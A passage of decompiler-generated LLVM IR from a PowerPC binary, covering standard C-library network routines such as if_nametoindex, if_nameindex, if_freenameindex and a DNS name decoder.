  br i1 %tmp7, label %dec_label_pc_100252fc, label %dec_label_pc_100252d0

dec_label_pc_100252d0:                            ; preds = %dec_label_pc_100252b8
  %v0_100252d0 = call i32 @__errno_location()
  %v1_100252d4 = inttoptr i32 %v0_100252d0 to i32*
  %v2_100252d4 = load i32, i32* %v1_100252d4, align 4
  store i32 %v2_100252d4, i32* @r31, align 4
  store i32 %v0_100252d0, i32* %r30.global-to-local, align 4
  %v0_100252dc = load i32, i32* @r29, align 4
  store i32 268587748, i32* @lr, align 4
  %v1_100252e0 = call i32 @__libc_close(i32 %v0_100252dc)
  %v0_100252e4 = load i32, i32* @r31, align 4
  %v3_100252e4 = icmp eq i32 %v0_100252e4, 19
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100252e4, label %dec_label_pc_100252f0, label %dec_label_pc_100252f4

dec_label_pc_100252f0:                            ; preds = %dec_label_pc_100252d0
  br label %dec_label_pc_100252f4

dec_label_pc_100252f4:                            ; preds = %dec_label_pc_100252d0, %dec_label_pc_100252f0
  %v0_100252f4 = phi i32 [ %v0_100252e4, %dec_label_pc_100252d0 ], [ 6, %dec_label_pc_100252f0 ]
  %v1_100252f4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100252f4 = inttoptr i32 %v1_100252f4 to i32*
  store i32 %v0_100252f4, i32* %v2_100252f4, align 4
  %v0_10025314.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10025314

dec_label_pc_100252fc:                            ; preds = %dec_label_pc_100252b8
  %v0_100252c8 = load i32, i32* @r29, align 4
  store i32 268587776, i32* @lr, align 4
  %v1_100252fc = call i32 @__libc_close(i32 %v0_100252c8)
  %v0_10025300 = load i32, i32* @r30, align 4
  store i32 %v2_1002529c, i32* @r4, align 4
  store i32 268587792, i32* @lr, align 4
  %v3_1002530c = call i32 @strncpy(i32 %v0_10025300, i32 %v2_1002529c, i32 16)
  store i32 %v3_1002530c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10025314

dec_label_pc_10025314:                            ; preds = %entry, %dec_label_pc_100252f4, %dec_label_pc_100252fc
  %v0_10025314 = phi i32 [ 0, %entry ], [ %v0_10025314.pre, %dec_label_pc_100252f4 ], [ %v3_1002530c, %dec_label_pc_100252fc ]
  store i32 %v0_10025280, i32* %r0.global-to-local, align 4
  ret i32 %v0_10025314

; uselistorder directives
  uselistorder i32 %v2_1002529c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10025314, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100252f4, { 1, 0 }
}

define i32 @__GI_if_nametoindex(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268587844, i32* @lr, align 4
  %v0_10025340 = call i32 @__opensock()
  store i32 %v0_10025340, i32* @r31, align 4
  %v1_10025344 = icmp slt i32 %v0_10025340, 0
  %v2_10025348 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10025348, i32* %r30.global-to-local, align 4
  %v0_1002534c = load i32, i32* @r29, align 4
  store i32 %v0_1002534c, i32* @r4, align 4
  store i32 %v2_10025348, i32* %r3.global-to-local, align 4
  br i1 %v1_10025344, label %dec_label_pc_100253bc, label %dec_label_pc_1002535c

dec_label_pc_1002535c:                            ; preds = %entry
  store i32 268587872, i32* @lr, align 4
  %v3_1002535c = call i32 @strncpy(i32 %v2_10025348, i32 %v0_1002534c, i32 16)
  %v0_10025364 = load i32, i32* @r31, align 4
  store i32 %v0_10025364, i32* @r3, align 4
  store i32 35123, i32* @r4, align 4
  store i32 %v2_10025348, i32* @r5, align 4
  store i32 268587896, i32* @lr, align 4
  %v0_10025374 = call i32 @ioctl()
  %v0_1002537c = load i32, i32* @r31, align 4
  store i32 %v0_1002537c, i32* %r3.global-to-local, align 4
  %tmp6 = icmp sgt i32 %v0_10025374, -1
  br i1 %tmp6, label %dec_label_pc_100253b0, label %dec_label_pc_10025384

dec_label_pc_10025384:                            ; preds = %dec_label_pc_1002535c
  %v0_10025384 = call i32 @__errno_location()
  store i32 %v0_10025384, i32* %r3.global-to-local, align 4
  %v1_10025388 = inttoptr i32 %v0_10025384 to i32*
  %v2_10025388 = load i32, i32* %v1_10025388, align 4
  store i32 %v2_10025388, i32* @r29, align 4
  store i32 %v0_10025384, i32* %r30.global-to-local, align 4
  %v0_10025390 = load i32, i32* @r31, align 4
  store i32 %v0_10025390, i32* %r3.global-to-local, align 4
  store i32 268587928, i32* @lr, align 4
  %v1_10025394 = call i32 @__libc_close(i32 %v0_10025390)
  %v0_10025398 = load i32, i32* @r29, align 4
  %v3_10025398 = icmp eq i32 %v0_10025398, 22
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10025398, label %dec_label_pc_100253a4, label %dec_label_pc_100253bc

dec_label_pc_100253a4:                            ; preds = %dec_label_pc_10025384
  %v1_100253a8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100253a8 = inttoptr i32 %v1_100253a8 to i32*
  store i32 38, i32* %v2_100253a8, align 4
  %v0_100253d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100253c0

dec_label_pc_100253b0:                            ; preds = %dec_label_pc_1002535c
  store i32 268587956, i32* @lr, align 4
  %v1_100253b0 = call i32 @__libc_close(i32 %v0_1002537c)
  store i32 %tmp, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100253c0

dec_label_pc_100253bc:                            ; preds = %dec_label_pc_10025384, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100253c0

dec_label_pc_100253c0:                            ; preds = %dec_label_pc_100253b0, %dec_label_pc_100253a4, %dec_label_pc_100253bc
  %v0_100253d0 = phi i32 [ %tmp, %dec_label_pc_100253b0 ], [ %v0_100253d0.pre, %dec_label_pc_100253a4 ], [ 0, %dec_label_pc_100253bc ]
  ret i32 %v0_100253d0

; uselistorder directives
  uselistorder i32 %v2_10025348, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_100253c0, { 2, 0, 1 }
}

define i32 @__GI_if_nameindex() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100253d4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100253d4, i32* %stack_var_-64, align 4
  %v5_100253d4 = ptrtoint i32* %stack_var_-64 to i32
  %v0_100253d8 = load i32, i32* @lr, align 4
  store i32 %v0_100253d8, i32* %r0.global-to-local, align 4
  store i32 %v5_100253d4, i32* @r31, align 4
  store i32 268588012, i32* @lr, align 4
  %v0_100253e8 = call i32 @__opensock()
  store i32 %v0_100253e8, i32* @r26, align 4
  %v1_100253ec = icmp slt i32 %v0_100253e8, 0
  store i32 0, i32* @r28, align 4
  br i1 %v1_100253ec, label %dec_label_pc_10025594, label %dec_label_pc_100253f8

dec_label_pc_100253f8:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r30, align 4
  %v2_10025428 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10025404

dec_label_pc_10025404:                            ; preds = %dec_label_pc_10025464, %dec_label_pc_100253f8
  %v0_10025404 = phi i32 [ 128, %dec_label_pc_100253f8 ], [ %v3_10025464, %dec_label_pc_10025464 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_100253f8 ], [ %v1_10025434, %dec_label_pc_10025464 ]
  %v1_10025404 = mul i32 %v0_10025404, 2
  store i32 %v1_10025404, i32* %r11.global-to-local, align 4
  %v2_10025408 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10025408, i32* %r9.global-to-local, align 4
  %v1_1002540c = add i32 %v1_10025404, 30
  store i32 %v1_1002540c, i32* %r0.global-to-local, align 4
  %v1_10025414 = call i32 @__asm_rlwinm(i32 %v1_1002540c, i32 0, i32 0, i32 27)
  store i32 35090, i32* @r4, align 4
  %v0_10025420 = load i32, i32* @r26, align 4
  store i32 %v0_10025420, i32* @r3, align 4
  %v0_10025424 = load i32, i32* %r9.global-to-local, align 4
  %v1_10025424 = load i32, i32* @r1, align 4
  %v3_10025424 = sub i32 %v1_10025424, %v1_10025414
  %v4_10025424 = inttoptr i32 %v3_10025424 to i32*
  store i32 %v0_10025424, i32* %v4_10025424, align 4
  store i32 %v2_10025428, i32* @r5, align 4
  %v0_1002542c = load i32, i32* @r30, align 4
  %v1_1002542c = load i32, i32* %r11.global-to-local, align 4
  %v2_1002542c = add i32 %v1_1002542c, %v0_1002542c
  store i32 %v2_1002542c, i32* @r30, align 4
  %v1_10025430 = add i32 %v3_10025424, 23
  store i32 %v1_10025430, i32* %r0.global-to-local, align 4
  %v1_10025434 = call i32 @__asm_rlwinm(i32 %v1_10025430, i32 0, i32 0, i32 27)
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1002543c = load i32, i32* %r11.global-to-local, align 4
  %v2_1002543c = add i32 %v1_1002543c, %v1_10025434
  store i32 %v2_1002543c, i32* %r9.global-to-local, align 4
  %v4_10025440 = icmp eq i32 %v2_1002543c, %stack_var_-52.0
  br i1 %v4_10025440, label %dec_label_pc_10025404.dec_label_pc_1002544c_crit_edge, label %dec_label_pc_10025448

dec_label_pc_10025404.dec_label_pc_1002544c_crit_edge: ; preds = %dec_label_pc_10025404
  %v0_10025450.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1002544c

dec_label_pc_10025448:                            ; preds = %dec_label_pc_10025404
  store i32 %v1_1002543c, i32* @r30, align 4
  br label %dec_label_pc_1002544c

dec_label_pc_1002544c:                            ; preds = %dec_label_pc_10025404.dec_label_pc_1002544c_crit_edge, %dec_label_pc_10025448
  %v0_10025450 = phi i32 [ %v0_10025450.pre, %dec_label_pc_10025404.dec_label_pc_1002544c_crit_edge ], [ %v1_1002543c, %dec_label_pc_10025448 ]
  store i32 %v0_10025450, i32* %stack_var_-56, align 4
  store i32 268588124, i32* @lr, align 4
  %v0_10025458 = call i32 @ioctl()
  %v1_1002545c = icmp slt i32 %v0_10025458, 0
  br i1 %v1_1002545c, label %dec_label_pc_100254a8, label %dec_label_pc_10025464

dec_label_pc_10025464:                            ; preds = %dec_label_pc_1002544c
  %v3_10025464 = load i32, i32* %stack_var_-56, align 4
  %v1_10025468 = load i32, i32* @r30, align 4
  %v4_10025468 = icmp eq i32 %v3_10025464, %v1_10025468
  br i1 %v4_10025468, label %dec_label_pc_10025404, label %dec_label_pc_10025470

dec_label_pc_10025470:                            ; preds = %dec_label_pc_10025464
  %v1_10025470 = udiv i32 %v3_10025464, 32
  store i32 %v1_10025470, i32* %r24.global-to-local, align 4
  %v1_10025474 = mul nuw nsw i32 %v1_10025470, 8
  %v1_10025478 = add nuw nsw i32 %v1_10025474, 8
  store i32 %v1_10025478, i32* @r3, align 4
  store i32 268588160, i32* @lr, align 4
  %v0_1002547c = call i32 @malloc()
  store i32 %v0_1002547c, i32* @r28, align 4
  %v3_10025480 = icmp eq i32 %v0_1002547c, 0
  br i1 %v3_10025480, label %dec_label_pc_10025490, label %dec_label_pc_10025488

dec_label_pc_10025488:                            ; preds = %dec_label_pc_10025470
  store i32 0, i32* @r27, align 4
  %v1_1002556c21 = load i32, i32* %r24.global-to-local, align 4
  %v2_1002556c22 = icmp eq i32 %v1_1002556c21, 0
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v0_1002547c, i32* %r25.global-to-local, align 4
  br i1 %v2_1002556c22, label %dec_label_pc_10025580, label %dec_label_pc_100254b8

dec_label_pc_10025490:                            ; preds = %dec_label_pc_10025470
  %v0_10025490 = load i32, i32* @r26, align 4
  store i32 268588184, i32* @lr, align 4
  %v1_10025494 = call i32 @__libc_close(i32 %v0_10025490)
  %v0_10025498 = call i32 @__errno_location()
  store i32 105, i32* %r0.global-to-local, align 4
  %v2_100254a0 = inttoptr i32 %v0_10025498 to i32*
  store i32 105, i32* %v2_100254a0, align 4
  br label %dec_label_pc_10025594

dec_label_pc_100254a8:                            ; preds = %dec_label_pc_1002544c
  %v0_100254a8 = load i32, i32* @r26, align 4
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100254b4.1357 to i32), i32* @lr, align 4
  %v1_100254b0 = call i32 @__libc_close(i32 %v0_100254a8)
  br label %dec_label_pc_10025594

dec_label_pc_100254b8:                            ; preds = %dec_label_pc_10025488, %dec_label_pc_10025560
  %v1_1002557424 = phi i32 [ %v1_10025574, %dec_label_pc_10025560 ], [ 0, %dec_label_pc_10025488 ]
  store i32 %v1_10025434, i32* %r0.global-to-local, align 4
  %v2_100254bc = add i32 %v1_1002557424, %v1_10025434
  store i32 %v2_100254bc, i32* @r30, align 4
  store i32 268588232, i32* @lr, align 4
  %v1_100254c4 = call i32 @__GI_strdup(i32 %v2_100254bc)
  store i32 %v1_100254c4, i32* %r0.global-to-local, align 4
  store i32 35123, i32* @r4, align 4
  %v3_100254d4 = icmp eq i32 %v1_100254c4, 0
  %v0_100254d8 = load i32, i32* @r26, align 4
  store i32 %v0_100254d8, i32* @r3, align 4
  %v0_100254dc = load i32, i32* @r30, align 4
  store i32 %v0_100254dc, i32* @r5, align 4
  %v1_100254e0 = load i32, i32* %r25.global-to-local, align 4
  %v2_100254e0 = add i32 %v1_100254e0, 4
  %v3_100254e0 = inttoptr i32 %v2_100254e0 to i32*
  store i32 %v1_100254c4, i32* %v3_100254e0, align 4
  br i1 %v3_100254d4, label %dec_label_pc_100254f8, label %dec_label_pc_100254e8

dec_label_pc_100254e8:                            ; preds = %dec_label_pc_100254b8
  store i32 268588272, i32* @lr, align 4
  %v0_100254ec = call i32 @ioctl()
  %tmp13 = icmp sgt i32 %v0_100254ec, -1
  br i1 %tmp13, label %dec_label_pc_10025560, label %dec_label_pc_100254f8

dec_label_pc_100254f8:                            ; preds = %dec_label_pc_100254e8, %dec_label_pc_100254b8
  %v0_100254f8 = call i32 @__errno_location()
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10025500 = inttoptr i32 %v0_100254f8 to i32*
  %v2_10025500 = load i32, i32* %v1_10025500, align 4
  store i32 %v2_10025500, i32* @r30, align 4
  store i32 %v0_100254f8, i32* %r25.global-to-local, align 4
  %v1_1002551416 = load i32, i32* @r27, align 4
  %v2_1002551417 = icmp eq i32 %v1_1002551416, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1002551c19 = load i32, i32* @r28, align 4
  store i32 %v1_1002551c19, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r29, align 4
  br i1 %v2_1002551417, label %dec_label_pc_10025528, label %dec_label_pc_1002550c

dec_label_pc_1002550c:                            ; preds = %dec_label_pc_100254f8, %dec_label_pc_1002550c
  %v2_1002551c20 = phi i32 [ %v2_1002551c, %dec_label_pc_1002550c ], [ %v1_1002551c19, %dec_label_pc_100254f8 ]
  %v1_1002550c = add i32 %v2_1002551c20, 4
  %v2_1002550c = inttoptr i32 %v1_1002550c to i32*
  %v3_1002550c = load i32, i32* %v2_1002550c, align 4
  store i32 %v3_1002550c, i32* @r3, align 4
  store i32 268588308, i32* @lr, align 4
  %v0_10025510 = call i32 @free()
  %v0_10025514.pre = load i32, i32* @r29, align 4
  %v1_10025514 = load i32, i32* @r27, align 4
  %v2_10025514 = icmp ult i32 %v0_10025514.pre, %v1_10025514
  %v1_10025518 = mul i32 %v0_10025514.pre, 8
  store i32 %v1_10025518, i32* %r0.global-to-local, align 4
  %v1_1002551c = load i32, i32* @r28, align 4
  %v2_1002551c = add i32 %v1_1002551c, %v1_10025518
  store i32 %v2_1002551c, i32* %r9.global-to-local, align 4
  %v1_10025520 = add i32 %v0_10025514.pre, 1
  store i32 %v1_10025520, i32* @r29, align 4
  br i1 %v2_10025514, label %dec_label_pc_1002550c, label %dec_label_pc_10025528

dec_label_pc_10025528:                            ; preds = %dec_label_pc_100254f8, %dec_label_pc_1002550c
  %v1_1002551c.lcssa = phi i32 [ %v1_1002551c19, %dec_label_pc_100254f8 ], [ %v1_1002551c, %dec_label_pc_1002550c ]
  store i32 %v1_1002551c.lcssa, i32* @r3, align 4
  store i32 268588336, i32* @lr, align 4
  %v0_1002552c = call i32 @free()
  %v0_10025530 = load i32, i32* @r26, align 4
  store i32 268588344, i32* @lr, align 4
  %v1_10025534 = call i32 @__libc_close(i32 %v0_10025530)
  %v0_10025538 = load i32, i32* @r30, align 4
  %v3_10025538 = icmp eq i32 %v0_10025538, 22
  br i1 %v3_10025538, label %dec_label_pc_10025540, label %dec_label_pc_10025548

dec_label_pc_10025540:                            ; preds = %dec_label_pc_10025528
  br label %dec_label_pc_10025554

dec_label_pc_10025548:                            ; preds = %dec_label_pc_10025528
  %v3_10025548 = icmp eq i32 %v0_10025538, 12
  br i1 %v3_10025548, label %dec_label_pc_10025550, label %dec_label_pc_10025554

dec_label_pc_10025550:                            ; preds = %dec_label_pc_10025548
  br label %dec_label_pc_10025554

dec_label_pc_10025554:                            ; preds = %dec_label_pc_10025548, %dec_label_pc_10025540, %dec_label_pc_10025550
  %v0_10025558 = phi i32 [ %v0_10025538, %dec_label_pc_10025548 ], [ 38, %dec_label_pc_10025540 ], [ 105, %dec_label_pc_10025550 ]
  store i32 0, i32* @r28, align 4
  %v1_10025558 = load i32, i32* %r25.global-to-local, align 4
  %v2_10025558 = inttoptr i32 %v1_10025558 to i32*
  store i32 %v0_10025558, i32* %v2_10025558, align 4
  br label %dec_label_pc_10025594

dec_label_pc_10025560:                            ; preds = %dec_label_pc_100254e8
  %v0_10025560 = load i32, i32* @r30, align 4
  %v1_10025560 = add i32 %v0_10025560, 16
  %v2_10025560 = inttoptr i32 %v1_10025560 to i32*
  %v3_10025560 = load i32, i32* %v2_10025560, align 4
  store i32 %v3_10025560, i32* %r0.global-to-local, align 4
  %v0_10025564 = load i32, i32* @r27, align 4
  %v1_10025564 = add i32 %v0_10025564, 1
  store i32 %v1_10025564, i32* @r27, align 4
  %v1_10025568 = load i32, i32* @r28, align 4
  %v2_10025568 = load i32, i32* @r29, align 4
  %v3_10025568 = add i32 %v2_10025568, %v1_10025568
  %v4_10025568 = inttoptr i32 %v3_10025568 to i32*
  store i32 %v3_10025560, i32* %v4_10025568, align 4
  %v0_1002556c.pre = load i32, i32* @r27, align 4
  %v0_10025578.pre = load i32, i32* @r28, align 4
  %v1_1002556c = load i32, i32* %r24.global-to-local, align 4
  %v2_1002556c = icmp ult i32 %v0_1002556c.pre, %v1_1002556c
  %v1_10025570 = mul i32 %v0_1002556c.pre, 8
  store i32 %v1_10025570, i32* %r29.global-to-local, align 4
  %v1_10025574 = mul i32 %v0_1002556c.pre, 32
  %v2_10025578 = add i32 %v1_10025570, %v0_10025578.pre
  store i32 %v2_10025578, i32* %r25.global-to-local, align 4
  br i1 %v2_1002556c, label %dec_label_pc_100254b8, label %dec_label_pc_10025580

dec_label_pc_10025580:                            ; preds = %dec_label_pc_10025488, %dec_label_pc_10025560
  %v2_10025578.lcssa = phi i32 [ %v0_1002547c, %dec_label_pc_10025488 ], [ %v2_10025578, %dec_label_pc_10025560 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10025584 = load i32, i32* @r26, align 4
  %v2_10025588 = add i32 %v2_10025578.lcssa, 4
  %v3_10025588 = inttoptr i32 %v2_10025588 to i32*
  store i32 0, i32* %v3_10025588, align 4
  %v0_1002558c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002558c = load i32, i32* @r28, align 4
  %v2_1002558c = load i32, i32* %r29.global-to-local, align 4
  %v3_1002558c = add i32 %v2_1002558c, %v1_1002558c
  %v4_1002558c = inttoptr i32 %v3_1002558c to i32*
  store i32 %v0_1002558c, i32* %v4_1002558c, align 4
  store i32 268588436, i32* @lr, align 4
  %v1_10025590 = call i32 @__libc_close(i32 %v0_10025584)
  br label %dec_label_pc_10025594

dec_label_pc_10025594:                            ; preds = %entry, %dec_label_pc_10025554, %dec_label_pc_100254a8, %dec_label_pc_10025490, %dec_label_pc_10025580
  %v2_10025594 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10025594, i32* %r11.global-to-local, align 4
  %v0_10025598 = load i32, i32* @r28, align 4
  %v1_1002559c = add i32 %v2_10025594, 4
  %v2_1002559c = inttoptr i32 %v1_1002559c to i32*
  %v3_1002559c = load i32, i32* %v2_1002559c, align 4
  store i32 %v3_1002559c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10025598

; uselistorder directives
  uselistorder i32 %v1_10025570, { 1, 0 }
  uselistorder i32 %v2_1002551c, { 1, 0 }
  uselistorder i32 %v1_10025518, { 1, 0 }
  uselistorder i32 %v0_10025514.pre, { 2, 0, 1 }
  uselistorder i32 %v1_10025470, { 1, 0 }
  uselistorder i32 %v3_10025464, { 0, 2, 1 }
  uselistorder i32 %v1_1002543c, { 1, 2, 0 }
  uselistorder i32 %v1_10025404, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 0, 1, 3, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %r29.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 105, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @__opensock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10025594, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10025580, { 1, 0 }
  uselistorder label %dec_label_pc_10025554, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025528, { 1, 0 }
  uselistorder label %dec_label_pc_1002550c, { 1, 0 }
  uselistorder label %dec_label_pc_100254b8, { 1, 0 }
  uselistorder label %dec_label_pc_1002544c, { 1, 0 }
}

define i32 @__GI_if_freenameindex(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r30, align 4
  br label %dec_label_pc_100255d4

dec_label_pc_100255cc:                            ; preds = %dec_label_pc_100255e0, %dec_label_pc_100255d4
  store i32 268588496, i32* @lr, align 4
  %v0_100255cc = call i32 @free()
  %v0_100255d0 = load i32, i32* @r31, align 4
  %v1_100255d0 = add i32 %v0_100255d0, 8
  br label %dec_label_pc_100255d4

dec_label_pc_100255d4:                            ; preds = %entry, %dec_label_pc_100255cc
  %v0_100255e0 = phi i32 [ %tmp, %entry ], [ %v1_100255d0, %dec_label_pc_100255cc ]
  store i32 %v0_100255e0, i32* @r31, align 4
  %v1_100255d4 = add i32 %v0_100255e0, 4
  %v2_100255d4 = inttoptr i32 %v1_100255d4 to i32*
  %v3_100255d4 = load i32, i32* %v2_100255d4, align 4
  store i32 %v3_100255d4, i32* @r3, align 4
  %v3_100255d8 = icmp eq i32 %v3_100255d4, 0
  br i1 %v3_100255d8, label %dec_label_pc_100255e0, label %dec_label_pc_100255cc

dec_label_pc_100255e0:                            ; preds = %dec_label_pc_100255d4
  %v1_100255e0 = inttoptr i32 %v0_100255e0 to i32*
  %v2_100255e0 = load i32, i32* %v1_100255e0, align 4
  %v3_100255e4 = icmp eq i32 %v2_100255e0, 0
  br i1 %v3_100255e4, label %dec_label_pc_100255ec, label %dec_label_pc_100255cc

dec_label_pc_100255ec:                            ; preds = %dec_label_pc_100255e0
  %v0_100255ec = load i32, i32* @r30, align 4
  store i32 %v0_100255ec, i32* @r3, align 4
  store i32 268588532, i32* @lr, align 4
  %v0_100255f0 = call i32 @free()
  ret i32 %v0_100255f0

; uselistorder directives
  uselistorder label %dec_label_pc_100255d4, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %v0_1002560c = call i32 @__asm_mfcr()
  store i32 %v0_1002560c, i32* @r26, align 4
  %v3_10025618 = icmp eq i32 %v0_1002560c, 0
  store i32 %arg2, i32* @r25, align 4
  store i32 %arg3, i32* @r24, align 4
  br i1 %v3_10025618, label %dec_label_pc_100256e0, label %dec_label_pc_10025630

dec_label_pc_10025630:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* @r27, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100256bc14 = load i32, i32* @r4, align 4
  %v2_100256bc15 = add i32 %v1_100256bc14, %v0_1002560c
  %v3_100256bc16 = inttoptr i32 %v2_100256bc15 to i8*
  %v4_100256bc17 = load i8, i8* %v3_100256bc16, align 1
  %v5_100256bc18 = zext i8 %v4_100256bc17 to i32
  store i32 %v5_100256bc18, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_100256c420 = icmp eq i8 %v4_100256bc17, 0
  br i1 %v3_100256c420, label %dec_label_pc_100256d0, label %dec_label_pc_10025640

dec_label_pc_10025640:                            ; preds = %dec_label_pc_10025630, %dec_label_pc_100256b8
  %v3_100256c022 = phi i1 [ %v3_100256c0, %dec_label_pc_100256b8 ], [ false, %dec_label_pc_10025630 ]
  %v5_100256bc21 = phi i32 [ %v5_100256bc, %dec_label_pc_100256b8 ], [ %v5_100256bc18, %dec_label_pc_10025630 ]
  br i1 %v3_100256c022, label %dec_label_pc_10025648, label %dec_label_pc_10025644

dec_label_pc_10025644:                            ; preds = %dec_label_pc_10025640
  %v0_10025644 = load i32, i32* @r27, align 4
  %v1_10025644 = add i32 %v0_10025644, 1
  store i32 %v1_10025644, i32* @r27, align 4
  br label %dec_label_pc_10025648

dec_label_pc_10025648:                            ; preds = %dec_label_pc_10025640, %dec_label_pc_10025644
  %v1_10025648 = call i32 @__asm_rlwinm(i32 %v5_100256bc21, i32 0, i32 24, i32 25)
  %v0_1002564c = load i32, i32* @r4, align 4
  %v1_1002564c = add i32 %v0_1002564c, 1
  store i32 %v1_1002564c, i32* @r30, align 4
  %v3_10025650 = icmp eq i32 %v1_10025648, 192
  br i1 %v3_10025650, label %dec_label_pc_10025658, label %dec_label_pc_10025678

dec_label_pc_10025658:                            ; preds = %dec_label_pc_10025648
  %v0_10025658 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10025658, label %dec_label_pc_10025660, label %dec_label_pc_1002565c

dec_label_pc_1002565c:                            ; preds = %dec_label_pc_10025658
  %v0_1002565c = load i32, i32* @r27, align 4
  %v1_1002565c = add i32 %v0_1002565c, 1
  store i32 %v1_1002565c, i32* @r27, align 4
  br label %dec_label_pc_10025660

dec_label_pc_10025660:                            ; preds = %dec_label_pc_10025658, %dec_label_pc_1002565c
  %v0_10025660 = load i32, i32* @r26, align 4
  %v2_10025660 = add i32 %v0_10025660, %v1_1002564c
  %v3_10025660 = inttoptr i32 %v2_10025660 to i8*
  %v4_10025660 = load i8, i8* %v3_10025660, align 1
  %v5_10025660 = zext i8 %v4_10025660 to i32
  %v1_10025664 = call i32 @__asm_rlwinm(i32 %v5_100256bc21, i32 8, i32 18, i32 23)
  %v0_10025668 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10025668, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10025670 = or i32 %v5_10025660, %v1_10025664
  store i32 %v2_10025670, i32* @r4, align 4
  br label %dec_label_pc_100256b8

dec_label_pc_10025678:                            ; preds = %dec_label_pc_10025648
  %v0_10025678 = load i32, i32* %r11.global-to-local, align 4
  %v2_10025678 = add i32 %v0_10025678, %v5_100256bc21
  store i32 %v2_10025678, i32* @r29, align 4
  %v1_1002567c = add i32 %v2_10025678, 1
  store i32 %v1_1002567c, i32* @r28, align 4
  %v1_10025680 = load i32, i32* @r24, align 4
  %v2_10025680 = icmp ult i32 %v1_1002567c, %v1_10025680
  br i1 %v2_10025680, label %dec_label_pc_10025688, label %dec_label_pc_100256e0

dec_label_pc_10025688:                            ; preds = %dec_label_pc_10025678
  %v0_10025688 = load i32, i32* @r26, align 4
  %v2_10025688 = add i32 %v0_10025688, %v1_1002564c
  store i32 %v2_10025688, i32* @r4, align 4
  %v0_1002568c = load i32, i32* @r25, align 4
  %v2_1002568c = add i32 %v0_1002568c, %v0_10025678
  store i32 %v2_1002568c, i32* @r3, align 4
  store i32 %v5_100256bc21, i32* @r5, align 4
  store i32 268588696, i32* @lr, align 4
  %v0_10025694 = call i32 @memcpy()
  %v0_10025698 = load i32, i32* @r30, align 4
  %v2_10025698 = add i32 %v0_10025698, %v5_100256bc21
  store i32 %v2_10025698, i32* @r4, align 4
  %v0_1002569c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1002569c, label %dec_label_pc_100256a4, label %dec_label_pc_100256a0

dec_label_pc_100256a0:                            ; preds = %dec_label_pc_10025688
  %v0_100256a0 = load i32, i32* @r27, align 4
  %v2_100256a0 = add i32 %v0_100256a0, %v5_100256bc21
  store i32 %v2_100256a0, i32* @r27, align 4
  br label %dec_label_pc_100256a4

dec_label_pc_100256a4:                            ; preds = %dec_label_pc_10025688, %dec_label_pc_100256a0
  %v0_100256a4 = load i32, i32* @r26, align 4
